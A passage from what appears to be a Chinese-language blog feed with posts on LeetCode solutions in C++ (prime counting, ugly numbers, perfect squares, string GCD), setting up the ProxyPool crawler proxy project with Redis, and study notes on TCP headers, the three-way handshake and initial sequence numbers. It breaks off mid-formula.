class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countPrimes</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">isPrime</span><span class="hljs-params">(n, <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (isPrime[i]) &#123;<br>                ans++;<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)i * i &lt; n) &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i * i; j &lt; n; j += i) &#123;<br>                        isPrime[j] = <span class="hljs-number">0</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="丑数">丑数</h2><blockquote><p>根据丑数的定义，0 和负整数一定不是丑数。当 n&gt;0 时，若 n 是丑数，则n 可以写成 <span class="math display">\[n = 2^a \times 3^b \times5^c\]</span>的形式，其中 a,b,c 都是非负整数。特别地，当 a,b,c 都是 0时，n=1。为判断 n 是否满足上述形式，可以对 n 反复除以 2,3,5，直到 n不再包含质因数 2,3,5。若剩下的数等于 1，则说明 n不包含其他质因数，是丑数；否则，说明 n 包含其他质因数，不是丑数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isUgly</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> factors[] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> factor : factors) &#123;<br>            <span class="hljs-keyword">while</span> (n % factor == <span class="hljs-number">0</span>) &#123;<br>                n /= factor;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> n == <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="有效的完全平方数">有效的完全平方数</h2><blockquote><p>法一：暴力。如果 num 为完全平方数，那么一定存在正整数 x 满足 <spanclass="math display">\[x \times x =\textit{num}\]</span>。于是我们可以从 1开始，从小到大遍历所有正整数，寻找是否存在满足 <spanclass="math display">\[x \times x = \textit{num}\]</span> 的正整数x。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPerfectSquare</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> i = <span class="hljs-number">1</span>; i * i &lt;= num; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i * i == num) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：二分查找。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPerfectSquare</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = num;<br><br>        <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>            <span class="hljs-type">int</span> mid = (right - left) / <span class="hljs-number">2</span> + left;<br>            <span class="hljs-type">long</span> square = (<span class="hljs-type">long</span>)mid * mid;<br>            <span class="hljs-keyword">if</span> (square &lt; num) &#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (square &gt; num) &#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="字符串的最大公因子">字符串的最大公因子</h2><blockquote><p>如果 str1 和 str2 拼接后等于 str2和 str1拼接起来的字符串（注意拼接顺序不同），那么一定存在符合条件的字符串X。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">gcdOfStrings</span><span class="hljs-params">(string str1, string str2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (str1 + str2 != str2 + str1)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125; <br><br>        <span class="hljs-keyword">return</span> str1.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">gcd</span>(str1.<span class="hljs-built_in">length</span>(),str2.<span class="hljs-built_in">length</span>()));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ProxyPool</title>
    <link href="/2024/04/30/Python/Spider/%E4%BB%A3%E7%90%86/ProxyPool/"/>
    <url>/2024/04/30/Python/Spider/%E4%BB%A3%E7%90%86/ProxyPool/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">0. 简介</h1><p>爬虫代理IP池项目,主要功能为定时采集网上发布的免费代理验证入库，定时验证入库的代理保证代理的可用性，提供<strong>API</strong>和<strong>CLI</strong>两种使用方式。</p><h1 id="准备工作">1. 准备工作</h1><h2 id="下载代码">1.1 下载代码</h2><ul><li>git clone</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:jhao104/proxy_pool.git<br></code></pre></td></tr></table></figure><ul><li>releases</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/jhao104/proxy_pool/releases 下载对应zip文件<br></code></pre></td></tr></table></figure><h2 id="安装依赖">1.2 安装依赖</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash'">pip install -r requirements.txt<br></code></pre></td></tr></table></figure><h2 id="安装redis">1.3 安装Redis</h2><p>教程：<a href="https://www.runoob.com/redis/redis-install.html">Redis安装 | 菜鸟教程 (runoob.com)</a></p><ol type="1"><li><p>启动服务端</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404301245795.png"alt="image-20240430122754850" /><figcaption aria-hidden="true">image-20240430122754850</figcaption></figure></li><li><p>启动客户端</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404301245796.png"alt="image-20240430123241394" /><figcaption aria-hidden="true">image-20240430123241394</figcaption></figure></li><li><p>修改<code>redis.windows.conf</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404301245797.png"alt="image-20240430123444049" /><figcaption aria-hidden="true">image-20240430123444049</figcaption></figure></li></ol><h2 id="配置代理池">1.4 配置代理池</h2><p>修改ProxyPool目录下的<code>setting.py</code>文件</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404301245798.png"alt="image-20240430123720744" /><figcaption aria-hidden="true">image-20240430123720744</figcaption></figure><h2 id="数据库可视化工具">1.5 数据库可视化工具</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404301245799.png"alt="image-20240430123850480" /><figcaption aria-hidden="true">image-20240430123850480</figcaption></figure><h1 id="使用">2. 使用</h1><h2 id="启动redis">2.1 启动Redis</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404301245795.png"alt="image-20240430122754850" /><figcaption aria-hidden="true">image-20240430122754850</figcaption></figure><h2 id="启动项目">2.2 启动项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 如果已经具备运行条件, 可用通过proxyPool.py启动。</span><br><span class="hljs-comment"># 程序分为: schedule 调度程序 和 server Api服务</span><br><br><span class="hljs-comment"># 启动调度程序</span><br>python proxyPool.py schedule<br><br><span class="hljs-comment"># 启动webApi服务</span><br>python proxyPool.py server<br></code></pre></td></tr></table></figure><h2 id="爬虫使用">2.3 爬虫使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_proxy</span>():<br>    <span class="hljs-keyword">return</span> requests.get(<span class="hljs-string">&quot;http://127.0.0.1:5010/get/&quot;</span>).json()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_proxy</span>(<span class="hljs-params">proxy</span>):<br>    requests.get(<span class="hljs-string">&quot;http://127.0.0.1:5010/delete/?proxy=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(proxy))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>代理</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP篇</title>
    <link href="/2024/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/TCP%E7%AF%87/"/>
    <url>/2024/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/TCP%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识">1. 基础知识</h1><h2 id="tcp-定义">1.1 TCP 定义</h2><p>TCP是<strong>面向连接的、可靠的、基于字节流</strong>的传输层通信协议。</p><ul><li><strong>面向连接</strong>：通信前需要进行三次握手；</li><li><strong>可靠的</strong>：无论网络链路中出现了怎样的链路变化，TCP都可以保证报文一定能够到达接收端；</li><li><strong>字节流</strong>：用户消息通过 TCP协议传输时，消息可能会被操作系统「分组」成多个的 TCP报文，如果接收方的程序如果不知道「消息的边界」，是无法读出一个有效的用户消息的。并且TCP 报文是「有序的」，当「前一个」TCP报文没有收到的时候，即使它先收到了后面的 TCP报文，那么也不能交给应用层去处理，同时对「重复」的 TCP报文会自动丢弃。</li></ul><h2 id="tcp-工作层次">1.2 TCP 工作层次</h2><p><code>IP</code>层是<strong>不可靠</strong>的，它不保证网络包的交付、不保证网络包的按序交付、也不保证网络包中的数据的完整性。如果需要保障网络数据包的可靠性，那么就需要由上层（传输层）的<code>TCP</code> 协议来负责。TCP是一个工作在<strong>传输层</strong>的<strong>可靠数据传输协议</strong>，它能确保接收端接收的网络包是<strong>无损坏、无间隔、非冗余和按序的。</strong>（为什么需要TCP 协议？ TCP 工作在哪一层？）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518175.png"alt="image-20240415112403826" /><figcaption aria-hidden="true">image-20240415112403826</figcaption></figure><h2 id="tcp-头部格式">1.2 TCP 头部格式</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518176.png"alt="image-20240415111742052" /><figcaption aria-hidden="true">image-20240415111742052</figcaption></figure><ul><li><strong>序列号</strong>：在建立连接时由计算机生成的随机数作为其初始值，通过SYN包传给接收端主机，每发送一次数据，就累加一次该<strong>数据字节数</strong>的大小。用来解决<strong>网络包乱序</strong>问题。</li><li><strong>确认应答号</strong>：指下一次<strong>期望收到</strong>的数据序列号，发送端收到这个确认应答以后可以认为在这个序号以前的数据都已经被正常接收。用来解决<strong>丢包</strong>的问题。</li><li><strong>控制位：</strong><ul><li><em>ACK</em>：该位为 <code>1</code>时，表示「确认应答号」字段有效，TCP 规定除了最初建立连接时的<code>SYN</code> 包之外该位必须设置为 <code>1</code> 。</li><li><em>RST</em>：该位为 <code>1</code> 时，表示 TCP连接中出现异常必须强制断开连接。</li><li><em>SYN</em>：该位为 <code>1</code>时，表示希望建立连接，并在「序列号」字段进行序列号初始值的设定。</li><li><em>FIN</em>： 该位为 <code>1</code>时，表示希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换<code>FIN</code> 位为 1 的 TCP 段。</li></ul></li></ul><h2 id="tcp-连接">1.4 TCP 连接</h2><ul><li>连接（RFC 793）：可靠性和流量控制机制要求 TCP初始化并维护每个数据流的某些状态信息。这些信息（包括<strong>套接字、序列号和窗口大小</strong>）的组合称为连接。</li><li>建立一个 TCP 连接是需要客户端与服务端达成上述三个信息的共识：<ul><li><strong>Socket</strong>：由 IP 地址和端口号组成</li><li><strong>序列号</strong>：用来解决乱序问题等</li><li><strong>窗口大小</strong>：用来做流量控制</li></ul></li></ul><h2 id="tcp-四元组">1.5 TCP 四元组</h2><ul><li>TCP 四元组可以<strong>唯一确定一个连接</strong>，四元组包括如下：<ul><li>源IP地址</li><li>源端口</li><li>目的IP地址</li><li>目的端口</li></ul></li><li>源IP地址和目的IP地址字段（32 位）是在 IP 头部中，作用是通过 IP协议发送报文给对方主机；源端口和目的端口字段（16 位）是在 TCP头部中，作用是告诉 TCP 协议应该把报文发给哪个进程。</li></ul><blockquote><p>Q：服务端（IP唯一）监听了一个端口，它的 TCP 的最大连接数是多少？</p><p>A：服务端通常固定在某个本地端口上监听，等待客户端的连接请求。客户端IP和端口是可变的，其理论值计算公式如下：<code>最大TCP连接数=客户端IP数*客户端端口数</code>。对IPv4，客户端的 IP 数最多为 <code>2</code> 的 <code>32</code>次方，客户端的端口数最多为 <code>2</code> 的 <code>16</code>次方，也就是说服务端单机最大 TCP 连接数约为 <code>2</code> 的<code>48</code> 次方。当然，服务端最大并发 TCP连接数远不能达到理论上限，会受以下因素影响：</p><ul><li><strong>文件描述符限制</strong>：每个 TCP连接都是一个文件，如果文件描述符被占满了，会发生 Too many openfiles。Linux 对可打开的文件描述符的数量分别作了三个方面的限制：</li><li><strong>系统级</strong>：当前系统可打开的最大数量，通过<code>cat /proc/sys/fs/file-max</code> 查看；</li><li><strong>用户级</strong>：指定用户可打开的最大数量，通过<code>cat /etc/security/limits.conf</code> 查看；</li><li><strong>进程级</strong>：单个进程可打开的最大数量，通过<code>cat /proc/sys/fs/nr_open</code> 查看；</li><li><strong>内存限制</strong>，每个 TCP连接都要占用一定内存，操作系统的内存是有限的，如果内存资源被占满后，会发生OOM（Out Of Memory）。</li></ul></blockquote><h2 id="tcp-和-udp">1.6 TCP 和 UDP</h2><h3 id="udp-头部格式">1.6.1 UDP 头部格式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518177.png"alt="image-20240415113638580" /><figcaption aria-hidden="true">image-20240415113638580</figcaption></figure><ul><li>端口：主要是告诉 UDP 协议应该把报文发给哪个进程</li><li>包长度：该字段保存了 UDP<strong>首部长度和数据长度</strong>之和</li><li>校验和：校验和是为了提供可靠的 UDP首部和数据而设计，防止收到在网络传输中受损的 UDP 包</li></ul><blockquote><p>Q：为什么 UDP 头部没有「首部长度」字段，而 TCP头部有「首部长度」字段呢？</p><p>A：TCP 有<strong>可变长</strong>的「选项」字段，而 UDP头部长度则是<strong>不会变化</strong>的，无需多一个字段去记录 UDP的首部长度。</p></blockquote><h3 id="区别">1.6.2 区别</h3><table><thead><tr class="header"><th></th><th>TCP</th><th>UDP</th></tr></thead><tbody><tr class="odd"><td>连接</td><td>面向连接</td><td>无连接</td></tr><tr class="even"><td>服务对象</td><td>一对一</td><td>一对一、一对多、多对多</td></tr><tr class="odd"><td>可靠性</td><td>可靠交付</td><td>尽最大努力交付</td></tr><tr class="even"><td>拥塞控制、流量控制</td><td>有</td><td>无</td></tr><tr class="odd"><td>首部开销</td><td>20字节，可能改变（选项字段）</td><td>8 个字节，固定不变</td></tr><tr class="even"><td>传输方式</td><td>流式传输，没有边界</td><td>按包发送，具有边界</td></tr><tr class="odd"><td>分片</td><td>如果大于 MSS 大小，则会在传输层进行分片</td><td>如果大于 MTU 大小，则会在 IP 层进行分片</td></tr></tbody></table><h3 id="应用场景">1.6.3 应用场景</h3><ul><li>TCP 是面向连接，能保证数据的可靠性交付，因此经常用于：</li><li><code>FTP</code> 文件传输；</li><li>HTTP / HTTPS；</li><li>UDP 是面向无连接，它可以随时发送数据，再加上 UDP本身的处理既简单又高效，因此经常用于：<ul><li>包总量较少的通信，如 <code>DNS</code> 、<code>SNMP</code> 等；</li><li>视频、音频等多媒体通信；</li><li>广播通信；</li></ul></li></ul><h3 id="端口">1.6.4 端口</h3><p><strong>可以使用相同端口。</strong>在数据链路层中，通过 MAC地址来寻找局域网中的主机。在网际层中，通过 IP地址来寻找网络中互连的主机或路由器。在传输层中，需要通过端口进行寻址，来识别同一计算机中同时通信的不同应用程序。即传输层的「端口号」的作用，是为了区分同一个主机上不同应用程序的数据包。传输层有两个传输协议分别是TCP 和 UDP，在内核中是两个完全独立的软件模块。当主机收到数据包后，可以在IP 包头的「协议号」字段知道该数据包是TCP/UDP，所以可以根据这个信息确定送给哪个模块（TCP/UDP）处理，送给TCP/UDP 模块的报文根据「端口号」确定送给哪个应用程序处理。因此，TCP/UDP各自的端口号也相互独立，如 TCP 有一个 80 号端口，UDP 也可以有一个 80号端口，二者并不冲突。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518178.png"alt="image-20240415114454749" /><figcaption aria-hidden="true">image-20240415114454749</figcaption></figure><h1 id="连接建立">2. 连接建立</h1><h2 id="三次握手过程">2.1 三次握手过程</h2><p>TCP 是面向连接的协议，所以使用 TCP前必须先建立连接，而建立连接是通过<strong>三次握手</strong>来进行的。三次握手的过程如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518179.png"alt="image-20240416141144833" /><figcaption aria-hidden="true">image-20240416141144833</figcaption></figure><ul><li><p>一开始，客户端和服务端都处于 <code>CLOSE</code>状态。先是服务端主动监听某个端口，处于 <code>LISTEN</code>状态。</p></li><li><p>客户端会随机初始化序号（<code>client_isn</code>），将此序号置于TCP 首部的「序号」字段中，同时把 <code>SYN</code> 标志位置为<code>1</code>，表示 <code>SYN</code> 报文。接着把第一个 SYN报文发送给服务端，表示向服务端发起连接，该报文不包含应用层数据，之后客户端处于<code>SYN-SENT</code> 状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518181.png"alt="image-20240416141334845" /><figcaption aria-hidden="true">image-20240416141334845</figcaption></figure></li><li><p>服务端收到客户端的 <code>SYN</code>报文后，首先服务端也随机初始化自己的序号（<code>server_isn</code>），将此序号填入TCP 首部的「序号」字段中，其次把 TCP 首部的「确认应答号」字段填入<code>client_isn + 1</code>, 接着把 <code>SYN</code> 和 <code>ACK</code>标志位置为<code>1</code>。最后把该报文发给客户端，该报文也不包含应用层数据，之后服务端处于<code>SYN-RCVD</code> 状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518182.png"alt="image-20240416141413290" /><figcaption aria-hidden="true">image-20240416141413290</figcaption></figure></li><li><p>客户端收到服务端报文后，还要向服务端回应最后一个应答报文，首先该应答报文TCP 首部 <code>ACK</code> 标志位置为 <code>1</code>，其次「确认应答号」字段填入 <code>server_isn + 1</code>，最后把报文发送给服务端，这次报文可以携带客户到服务端的数据，之后客户端处于<code>ESTABLISHED</code> 状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518183.png"alt="image-20240416141505192" /><figcaption aria-hidden="true">image-20240416141505192</figcaption></figure></li><li><p>服务端收到客户端的应答报文后，也进入 <code>ESTABLISHED</code>状态。</p></li><li><p>一旦完成三次握手，双方都处于 <code>ESTABLISHED</code>状态，此时连接就已建立完成，客户端和服务端就可以相互发送数据了。</p></li><li><p><strong>第三次握手是可以携带数据的，前两次握手是不可以携带数据的。</strong></p></li></ul><h2 id="查看-tcp-状态linux">2.2 查看 TCP 状态（Linux）</h2><p><code>netstat -napt</code>：显示所有当前活动的TCP连接，包括连接的地址和端口号，以及与之相关的进程和程序信息。</p><ul><li><code>netstat</code>：这是一个用于检查网络连接信息的命令。</li><li><code>-n</code>：这个选项表示以数字形式显示地址和端口号，而不是尝试解析为主机名和服务名。使用此选项可以加快命令执行速度。</li><li><code>-a</code>：此选项显示所有的连接和监听端口，包括正在侦听的连接。</li><li><code>-p</code>：此选项显示建立相关链接的程序和进程ID。</li><li><code>-t</code>：此选项只显示TCP协议的连接信息。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518184.png"alt="image-20240416141902265" /><figcaption aria-hidden="true">image-20240416141902265</figcaption></figure><h2 id="为什么需要三次握手">2.3 为什么需要三次握手？</h2><p>为什么三次握手才可以初始化 Socket、序列号和窗口大小并建立 TCP连接：</p><ul><li>阻止重复历史连接的初始化（主要原因）</li><li>同步双方的初始序列号</li></ul><h3 id="阻止重复历史连接的初始化">2.3.1 阻止重复历史连接的初始化</h3><p>三次握手的<strong>首要原因</strong>是为了<strong>防止旧的重复连接初始化造成混乱</strong>。具体场景：客户端先发送了SYN（seq = 90）报文，然后客户端宕机了，而且这个 SYN报文还被网络阻塞了，服务端并没有收到，接着客户端重启后，又重新向服务端建立连接，发送了SYN（seq = 100）报文（<em>注意！不是重传 SYN，重传的 SYN的序列号是一样的</em>）。三次握手阻止历史连接过程如下图所示：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518185.png"alt="image-20240416142529089" /><figcaption aria-hidden="true">image-20240416142529089</figcaption></figure><blockquote><p>Q：服务端在收到 RST 报文之前，先收到了新 SYN报文，此时会发生什么?</p><p>A：当服务端第一次收到 SYN 报文，也就是收到旧 SYN 报文时，就会回复 SYN+ ACK 报文给客户端，此报文中的确认号是 91（90+1）。然后这时再收到新 SYN报文时，就会回 Challenge ACk (opens new window)报文给客户端，这个 ACK报文并不是确认收到新 SYN 报文的，而是上一次的 ACK确认号，也就是91（90+1）。客户端收到此 ACK报文时，发现该报文没有确认它发送的任何内容，由于不同步，它发送一个 RST报文。</p></blockquote><p>为什么 TCP两次握手为什么无法阻止阻止重复历史连接的初始化呢？主要是因为<strong>在两次握手的情况下，服务端没有中间状态给客户端来阻止历史连接，导致服务端可能建立一个历史连接，造成资源浪费</strong>。如下图所示，如果采用两次握手建立TCP连接的场景下，服务端在向客户端发送数据前，并没有阻止掉历史连接，导致服务端建立了一个历史连接，又白白发送了数据，妥妥地浪费了服务端的资源。因此，要解决这种现象，最好就是在服务端发送数据前，也就是建立连接之前，要阻止掉历史连接，这样就不会造成资源浪费，而要实现这个功能，就需要三次握手。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518186.png"alt="image-20240416144805284" /><figcaption aria-hidden="true">image-20240416144805284</figcaption></figure><h3 id="同步双方初始序列号">2.3.2 同步双方初始序列号</h3><p>TCP 协议的通信双方， 都必须维护一个「序列号」，序列号是可靠传输的一个关键因素，它的作用：</p><ul><li>接收方可以去除重复的数据；</li><li>接收方可以根据数据包的序列号按序接收；</li><li>可以标识发送出去的数据包中， 哪些是已经被对方收到的（通过 ACK报文中的序列号知道）；</li></ul><p>序列号在 TCP连接中占据着非常重要的作用，当客户端发送携带「初始序列号」的<code>SYN</code> 报文的时候，需要服务端回一个 <code>ACK</code>应答报文，表示客户端的 SYN报文已被服务端成功接收，那当服务端发送「初始序列号」给客户端的时候，依然也要得到客户端的应答回应，这样<strong>一来一回</strong>，才能<strong>确保双方的初始序列号能被可靠的同步</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518187.png"alt="image-20240416145542072" /><figcaption aria-hidden="true">image-20240416145542072</figcaption></figure><p>四次握手其实也能够可靠的同步双方的初始化序号，但由于第二步和第三步可以优化成一步，所以就成了「三次握手」。而两次握手只保证了一方的初始序列号能被对方成功接收，没办法保证双方的初始序列号都能被确认接收。</p><h3 id="小结">2.3.3 小结</h3><p>TCP建立连接时，通过三次握手<strong>能防止历史连接的建立，能减少双方不必要的资源开销，能帮助双方同步初始化序列号</strong>。</p><p>不使用「两次握手」和「四次握手」的原因：</p><ul><li>「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号；</li><li>「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</li></ul><h2 id="初始序列号">2.4 初始序列号</h2><h3 id="随机化">2.4.1 随机化</h3><p>为什么每次建立 TCP连接时，初始化的序列号都要求不一样，主要原因有两个方面：</p><ul><li>防止历史报文被下一个相同四元组的连接接收（主要方面）；</li><li>防止黑客伪造的相同序列号的 TCP 报文；</li></ul><p>假设每次建立连接，客户端和服务端的初始化序列号都是从 0开始。过程如下：</p><ul><li>客户端和服务端建立一个 TCP连接，在客户端发送数据包被网络阻塞了，然后超时重传了这个数据包，而此时服务端设备断电重启了，之前与客户端建立的连接就消失了，于是在收到客户端的数据包的时候就会发送RST 报文。</li><li>紧接着，客户端又与服务端建立了与上一个连接相同四元组的连接；</li><li>在新连接建立完成后，上一个连接中被网络阻塞的数据包正好抵达了服务端，刚好该数据包的序列号正好是在服务端的接收窗口内，所以该数据包会被服务端正常接收，就会造成数据错乱。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518188.png"alt="image-20240416150751412" /><figcaption aria-hidden="true">image-20240416150751412</figcaption></figure><p>如果每次建立连接客户端和服务端的初始化序列号都不一样，就有很大概率因为历史报文的序列号不在对方接收窗口，从而很大程度上避免了解释历史报文，如下图所示：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518189.png"alt="image-20240416150901464" /><figcaption aria-hidden="true">image-20240416150901464</figcaption></figure><h3 id="产生算法">2.4.2 产生算法</h3><p>RFC 793 提到初始化序列号 ISN随机生成算法：<code>ISN = M + F(localhost, localport, 